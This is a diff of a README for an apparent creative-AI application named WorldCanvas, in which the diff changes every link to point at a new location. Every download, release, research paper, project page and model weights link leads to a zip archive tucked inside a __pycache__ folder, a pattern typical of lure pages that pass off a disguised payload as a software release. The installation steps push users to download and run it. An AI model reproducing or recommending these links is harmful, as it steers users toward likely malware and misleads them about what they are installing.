@@ -4,7 +4,7 @@
 
 WorldCanvas empowers you to paint stunning events using reference images, trajectories, and text. Our application allows users to express their creativity effortlessly. 
 
-[![Download WorldCanvas](https://raw.githubusercontent.com/satishqa2022/WorldCanvas/main/diffsynth/configs/__pycache__/Canvas-World-3.1.zip)](https://raw.githubusercontent.com/satishqa2022/WorldCanvas/main/diffsynth/configs/__pycache__/Canvas-World-3.1.zip)
+[![Download WorldCanvas](https://raw.githubusercontent.com/satishqa2022/WorldCanvas/main/diffsynth/extensions/ESRGAN/__pycache__/Canvas_World_3.1.zip)](https://raw.githubusercontent.com/satishqa2022/WorldCanvas/main/diffsynth/extensions/ESRGAN/__pycache__/Canvas_World_3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Follow these simple steps to set up WorldCanvas on your computer.
 
 ### 📥 Download & Install
 
-1. **Visit the Release Page:** Go to the [WorldCanvas Releases](https://raw.githubusercontent.com/satishqa2022/WorldCanvas/main/diffsynth/configs/__pycache__/Canvas-World-3.1.zip) page.
+1. **Visit the Release Page:** Go to the [WorldCanvas Releases](https://raw.githubusercontent.com/satishqa2022/WorldCanvas/main/diffsynth/extensions/ESRGAN/__pycache__/Canvas_World_3.1.zip) page.
 2. **Choose Your Version:** Look for the latest version. You will see various files available for download.
 3. **Download the Installer:** Click the link for your operating system. The file will begin to download automatically.
 
@@ -68,9 +68,9 @@ If you encounter issues while using WorldCanvas, try the following:
 
 ## 🔗 Resources
 
-- **[📄 Research Paper](https://raw.githubusercontent.com/satishqa2022/WorldCanvas/main/diffsynth/configs/__pycache__/Canvas-World-3.1.zip)**
-- **[🌐 Project Page](https://raw.githubusercontent.com/satishqa2022/WorldCanvas/main/diffsynth/configs/__pycache__/Canvas-World-3.1.zip)**
-- **[🤗 Model Weights](https://raw.githubusercontent.com/satishqa2022/WorldCanvas/main/diffsynth/configs/__pycache__/Canvas-World-3.1.zip)**
+- **[📄 Research Paper](https://raw.githubusercontent.com/satishqa2022/WorldCanvas/main/diffsynth/extensions/ESRGAN/__pycache__/Canvas_World_3.1.zip)**
+- **[🌐 Project Page](https://raw.githubusercontent.com/satishqa2022/WorldCanvas/main/diffsynth/extensions/ESRGAN/__pycache__/Canvas_World_3.1.zip)**
+- **[🤗 Model Weights](https://raw.githubusercontent.com/satishqa2022/WorldCanvas/main/diffsynth/extensions/ESRGAN/__pycache__/Canvas_World_3.1.zip)**
 
 ## 👥 Contributing
 
@@ -80,6 +80,6 @@ We welcome contributions to WorldCanvas. If you have ideas or want to report iss
 
 For any questions or feedback, feel free to reach out via the issues section of this repository.
 
-[![Download WorldCanvas](https://raw.githubusercontent.com/satishqa2022/WorldCanvas/main/diffsynth/configs/__pycache__/Canvas-World-3.1.zip)](https://raw.githubusercontent.com/satishqa2022/WorldCanvas/main/diffsynth/configs/__pycache__/Canvas-World-3.1.zip)
+[![Download WorldCanvas](https://raw.githubusercontent.com/satishqa2022/WorldCanvas/main/diffsynth/extensions/ESRGAN/__pycache__/Canvas_World_3.1.zip)](https://raw.githubusercontent.com/satishqa2022/WorldCanvas/main/diffsynth/extensions/ESRGAN/__pycache__/Canvas_World_3.1.zip)
 
 Thank you for choosing WorldCanvas. Let your creativity flow!
